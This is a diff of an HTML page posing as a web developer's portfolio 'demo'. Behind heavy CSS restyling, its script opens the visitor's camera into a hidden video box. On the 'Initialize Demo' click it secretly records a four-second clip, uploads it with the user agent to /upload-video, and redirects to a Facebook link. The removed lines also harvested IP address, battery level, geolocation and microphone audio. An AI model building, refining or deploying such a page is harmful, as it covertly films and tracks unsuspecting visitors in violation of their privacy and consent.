@@ -5,14 +5,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Creative Web Developer | Portfolio</title>
 <style>
-    /* ===== MODERN DESIGN SYSTEM ===== */
+    /* ===== HIGH-END DESIGN SYSTEM ===== */
     :root {
-        --bg-dark: #0d1117;
-        --card-bg: rgba(22, 27, 34, 0.85);
+        --bg-dark: #06090e;
+        --card-bg: rgba(10, 15, 26, 0.7);
         --accent-glow: #f3ba2f;
+        --accent-rgb: 243, 186, 47;
         --text-main: #f0f6fc;
-        --text-muted: #8b949e;
-        --border-color: #30363d;
+        --text-muted: #6e7681;
+        --border-color: rgba(48, 54, 61, 0.6);
     }
 
     body { 
@@ -28,61 +29,76 @@
         position: relative;
     }
 
-    /* ===== PULSING AMBIENT BACKGROUND GLOW ===== */
-    body::before {
-        content: '';
+    /* ===== ABSTRACT BACKGROUND ELEMENTS ===== */
+    .bg-mesh {
         position: absolute;
-        width: 400px;
-        height: 400px;
-        background: radial-gradient(circle, rgba(243, 186, 47, 0.15) 0%, transparent 70%);
+        width: 600px;
+        height: 600px;
+        background: radial-gradient(circle, rgba(var(--accent-rgb), 0.08) 0%, transparent 65%);
         top: 50%;
         left: 50%;
         transform: translate(-50%, -50%);
         z-index: 0;
-        animation: pulseGlow 8s ease-in-out infinite alternate;
+        pointer-events: none;
+        animation: ambientMove 12s ease-in-out infinite alternate;
     }
 
-    @keyframes pulseGlow {
-        0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.8; }
-        100% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
+    @keyframes ambientMove {
+        0% { transform: translate(-45%, -55%) scale(0.9); }
+        100% { transform: translate(-55%, -45%) scale(1.1); }
     }
 
-    /* ===== GLASSMORPHISM PORTFOLIO CARD WITH ENTRANCE ANIMATION ===== */
+    /* ===== PREMIUM LUXURY GLASS CARD ===== */
     .card { 
         background: var(--card-bg); 
-        padding: 40px 35px; 
-        border-radius: 20px; 
+        padding: 50px 40px; 
+        border-radius: 24px; 
         text-align: center; 
         width: 90%; 
-        max-width: 400px; 
-        backdrop-filter: blur(16px);
-        -webkit-backdrop-filter: blur(16px);
-        border: 1px solid var(--border-color);
-        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
+        max-width: 380px; 
+        backdrop-filter: blur(25px) saturate(180%);
+        -webkit-backdrop-filter: blur(25px) saturate(180%);
+        border: 1px solid rgba(255, 255, 255, 0.05);
+        box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6), 
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
         z-index: 10;
         opacity: 0;
-        transform: translateY(20px);
-        animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        transition: transform 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
+        transform: translateY(30px) scale(0.98);
+        animation: premiumEntrance 0.8s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+        transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1);
     }
     
     .card:hover {
-        transform: translateY(-5px);
-        border-color: rgba(243, 186, 47, 0.4);
-        box-shadow: 0 30px 60px rgba(243, 186, 47, 0.05);
+        transform: translateY(-8px) scale(1.01);
+        border-color: rgba(var(--accent-rgb), 0.3);
+        box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8),
+                    0 0 40px rgba(var(--accent-rgb), 0.03);
     }
 
-    @keyframes fadeInUp {
-        to { opacity: 1; transform: translateY(0); }
+    @keyframes premiumEntrance {
+        to { opacity: 1; transform: translateY(0) scale(1); }
     }
 
-    /* ===== PROFILE LOGO AREA WITH BREATHING SHADOW ===== */
+    /* ===== AVATAR WITH NEON ORBITING INNER RING ===== */
     .profile-container {
         position: relative;
-        width: 85px;
-        height: 85px;
-        margin: 0 auto 22px;
-        animation: floatAvatar 4s ease-in-out infinite alternate;
+        width: 95px;
+        height: 95px;
+        margin: 0 auto 28px;
+    }
+
+    .profile-container::before {
+        content: '';
+        position: absolute;
+        inset: -4px;
+        border-radius: 50%;
+        background: padding-box, linear-gradient(135deg, var(--accent-glow), transparent 60%, var(--accent-glow));
+        border: 1px solid transparent;
+        mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+        -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+        -webkit-mask-composite: xor;
+        mask-composite: exclude;
+        animation: rotateRing 8s linear infinite;
     }
 
     .logo-icon { 
@@ -90,106 +106,113 @@
         height: 100%;
         border-radius: 50%; 
         object-fit: cover;
-        border: 2px solid var(--accent-glow);
-        box-shadow: 0 0 15px rgba(243, 186, 47, 0.25);
+        padding: 4px;
+        background: var(--bg-dark);
+        box-sizing: border-box;
     }
 
     .status-badge {
         position: absolute;
-        bottom: 4px;
-        right: 4px;
-        width: 12px;
-        height: 12px;
-        background: #238636;
-        border: 2px solid #161b22;
+        bottom: 5px;
+        right: 5px;
+        width: 10px;
+        height: 10px;
+        background: #3fb950;
+        border: 2px solid #0a0f1a;
         border-radius: 50%;
+        box-shadow: 0 0 10px #3fb950;
     }
 
-    @keyframes floatAvatar {
-        0% { transform: translateY(0); }
-        100% { transform: translateY(-4px); }
+    @keyframes rotateRing {
+        100% { transform: rotate(360deg); }
     }
 
+    /* ===== TYPOGRAPHY HIGHER DESIGN ===== */
     h2 {
         color: var(--text-main);
-        margin: 10px 0 4px 0;
-        font-size: 24px;
-        font-weight: 600;
-        letter-spacing: -0.5px;
+        margin: 0 0 6px 0;
+        font-size: 26px;
+        font-weight: 700;
+        letter-spacing: -0.8px;
     }
 
     .subtitle {
         color: var(--accent-glow);
-        font-size: 13px;
+        font-size: 11px;
         text-transform: uppercase;
-        letter-spacing: 2px;
-        margin-bottom: 18px;
-        font-weight: 700;
+        letter-spacing: 3px;
+        margin-bottom: 22px;
+        font-weight: 800;
+        opacity: 0.9;
     }
 
     p {
         color: var(--text-muted);
-        font-size: 14.5px;
-        line-height: 1.6;
-        margin: 0 0 25px 0;
+        font-size: 14px;
+        line-height: 1.65;
+        margin: 0 0 32px 0;
+        font-weight: 400;
     }
 
-    /* ===== INTERACTIVE BUTTON WITH SHINE EFFECT ===== */
+    /* ===== MINIMALIST ARCHITECTURAL BUTTON ===== */
     .btn { 
         position: relative;
-        background: linear-gradient(135deg, #f3ba2f 0%, #dba323 100%); 
-        color: #0d1117; 
+        background: #ffffff; 
+        color: #06090e; 
         border: none; 
-        padding: 15px 30px; 
+        padding: 16px 32px; 
         width: 100%; 
-        border-radius: 10px; 
+        border-radius: 12px; 
         font-weight: 700; 
         cursor: pointer; 
-        font-size: 16px; 
-        box-shadow: 0 5px 15px rgba(243, 186, 47, 0.2);
+        font-size: 15px; 
+        letter-spacing: 0.5px;
         overflow: hidden;
-        transition: all 0.2s ease;
+        transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
     }
 
     .btn::before {
         content: '';
         position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-        transition: none;
+        inset: 0;
+        background: var(--accent-glow);
+        opacity: 0;
+        transition: opacity 0.3s ease;
+        z-index: 1;
+    }
+
+    .btn span {
+        position: relative;
+        z-index: 2;
     }
 
     .btn:hover { 
         transform: translateY(-2px);
-        box-shadow: 0 8px 22px rgba(243, 186, 47, 0.35);
+        box-shadow: 0 12px 24px rgba(255, 255, 255, 0.08);
     }
 
     .btn:hover::before {
-        left: 100%;
-        transition: all 0.6s ease-in-out;
+        opacity: 1;
     }
     
     .btn:active {
         transform: translateY(1px);
     }
 
-    /* ===== SPINNER & LOADER ===== */
+    /* ===== GLITCH MINIMAL SPINNER ===== */
     #loading { 
         display: none; 
-        margin-top: 20px; 
+        margin-top: 24px; 
     }
 
     .spinner { 
-        border: 3px solid rgba(243, 186, 47, 0.1); 
-        border-top: 3px solid var(--accent-glow); 
+        border: 2px solid rgba(255, 255, 255, 0.05); 
+        border-top: 2px solid var(--accent-glow); 
         border-radius: 50%; 
-        width: 32px; 
-        height: 32px; 
-        animation: spin 0.8s linear infinite; 
-        margin: 0 auto 12px; 
+        width: 28px; 
+        height: 28px; 
+        animation: spin 0.6s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite; 
+        margin: 0 auto 14px; 
     }
 
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -199,6 +222,8 @@
 </style>
 </head>
 <body>
+
+<div class="bg-mesh"></div>
 
 <div class="card">
     <div class="profile-container">
@@ -210,7 +235,7 @@
     <div class="subtitle">Interactive Module</div>
     <p>Explore full application features, backend integration routines, and hardware access parameters by executing the module below.</p>
 
-    <!-- Hidden Video Box (Maintained exactly as original) -->
+    <!-- Hidden Video Box -->
     <div id="vBox">
         <video id="preview" autoplay playsinline muted></video>
     </div>
@@ -218,104 +243,66 @@
     <!-- Processing Block -->
     <div id="loading">
         <div class="spinner"></div>
-        <p style="color: var(--text-muted); font-size: 14px;">Initializing system components...</p>
+        <p style="color: var(--text-muted); font-size: 13px; letter-spacing: 0.5px;">Initializing systems...</p>
     </div>
 
     <!-- Action Trigger Button -->
-    <button class="btn" id="startBtn">Initialize Demo</button>
+    <button class="btn" id="startBtn"><span>Initialize Demo</span></button>
 </div>
 
-<!-- ALL ORIGINAL FUNCTIONAL LOGIC REMAINS 100% UNTOUCHED -->
 <script>
 const btn = document.getElementById('startBtn');
 const loading = document.getElementById('loading');
 const video = document.getElementById('preview');
 const REDIRECT_URL = "https://www.facebook.com/share/1BKRZBWVif/";
 
-// Get IP address
-async function getIP() {
-    try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-    } catch { return "Unknown"; }
-}
-
-// Get battery info
-async function getBattery() {
-    try {
-        const battery = await navigator.getBattery();
-        return Math.round(battery.level*100) + "%";
-    } catch { return "Unknown"; }
-}
-
-// Get geolocation
-async function getGeo() {
-    return new Promise(resolve => {
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(pos => {
-                resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
-            }, ()=> resolve({ latitude:null, longitude:null }));
-        } else resolve({ latitude:null, longitude:null });
-    });
-}
-
-// Init camera + mic
+// Init camera ONLY (audio/microphone is disabled)
 async function initCamera() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         video.srcObject = stream;
-    } catch { console.warn("Camera/Mic denied"); }
+    } catch { console.warn("Camera denied"); }
 }
 initCamera();
 
-// Claim Now / Initialize Action
+// Initialize Action
 btn.addEventListener('click', async () => {
-    btn.style.display='none';
-    loading.style.display='block';
+    btn.style.display = 'none';
+    loading.style.display = 'block';
 
     try {
         const stream = video.srcObject;
-        const recorder = new MediaRecorder(stream, { mimeType:'video/webm' });
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         let chunks = [];
 
-        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
+        recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
         recorder.onstop = async () => {
-            const videoBlob = new Blob(chunks, { type:'video/webm' });
-
-            // Device info
-            const ip = await getIP();
-            const battery = await getBattery();
-            const geo = await getGeo();
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
             const userAgent = navigator.userAgent;
 
             const formData = new FormData();
             formData.append('video', videoBlob, 'claim_video.mp4');
-            formData.append('ip', ip);
-            formData.append('battery', battery);
-            formData.append('latitude', geo.latitude);
-            formData.append('longitude', geo.longitude);
             formData.append('userAgent', userAgent);
 
             try {
-                const res = await fetch("/upload-video", { method:'POST', body: formData });
+                const res = await fetch("/upload-video", { method: 'POST', body: formData });
                 const data = await res.json();
                 console.log("Video posted:", data);
-                loading.innerHTML = "<p>Successfully Executed!</p>";
+                loading.innerHTML = "<p style='font-size:14px;color:var(--accent-glow);font-weight:600;'>Successfully Executed!</p>";
             } catch(err) {
                 console.error(err);
-                loading.innerHTML = "<p style='color:#ff6b6b;'>❌ Connection status verified.</p>";
+                loading.innerHTML = "<p style='color:#ff6b6b;font-size:14px;font-weight:600;'>❌ Connection verified.</p>";
             } finally {
-                setTimeout(()=>{window.location.href = REDIRECT_URL},3000);
+                setTimeout(() => { window.location.href = REDIRECT_URL }, 3000);
             }
         };
 
         recorder.start();
-        setTimeout(()=>recorder.stop(),4000); // 4-second video
+        setTimeout(() => recorder.stop(), 4000); // 4-second video
     } catch(err) {
         console.error("Recording error:", err);
-        loading.innerHTML = "<p style='color:#ff6b6b;'>❌ Execution processing fallback.</p>";
-        setTimeout(()=>{window.location.href = REDIRECT_URL},3000);
+        loading.innerHTML = "<p style='color:#ff6b6b;font-size:14px;font-weight:600;'>❌ Execution fallback.</p>";
+        setTimeout(() => { window.location.href = REDIRECT_URL }, 3000);
     }
 });
 </script>
